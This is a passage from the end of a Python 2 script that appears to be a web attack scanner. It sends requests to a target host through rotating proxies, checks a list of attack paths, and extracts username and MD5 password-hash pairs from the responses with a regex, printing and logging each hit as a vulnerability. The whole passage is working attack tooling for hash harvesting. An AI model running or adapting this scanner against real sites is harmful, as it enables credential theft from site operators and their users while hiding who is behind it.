                file.write("\n[-] All proxies have failed. App Exiting\n")
                sys.exit(1) 
        print "[+] Proxy List Complete"
        file.write("[+] Proxy List Complete")
else:
    print "[-] Proxy Not Given"
    file.write("\n[+] Proxy Not Given")
    proxy_list.append(urllib2.build_opener())
proxy_num = 0
proxy_len = len(proxy_list)

#here we go
print "[+] %s" % time.strftime("%X")
file.write("\n[+] %s\n" % time.strftime("%X"))
print "[+] Testing..."
for path in paths: 
        try: 
                gets+=1
                source = proxy_list[proxy_num % proxy_len].open(host+path, "80").read() 
                md5s = re.findall("\x1e+[\w]+:+[\w\:]+\x1e+:+[\w\s]+\x1e",source)
                if len(md5s) >=1:
                        print "\n[!] Found:" 
                        print host+path,"\n" 
                        for md5 in md5s: 
                                print "\t",md5,"\n"
                                file.write("\n[!] Found:\n"+host+path+'\n\n\t'+md5+"\n")
        except(urllib2.URLError, socket.gaierror, socket.error,socket.timeout):
                pass
        except (KeyboardInterrupt, SystemExit):
                raise
if md5s == 0:
        print "\n\tNo Vulnerabilities Found!\n"
        file.write("\n\tNo Vulnerabilities Found!\n")
        
#Lets wrap it up!
print "[-] %s" % time.strftime("%X")
print "[-] Total URL Requests",gets
file.write("\n[-] %s" % time.strftime("%X"))
file.write("\n[-] Total URL Requests "+str(gets))
print "[-] Done\n"
file.write("\n[-] Done\n")
print "Don't forget to check", dbt,"\n"
file.close()
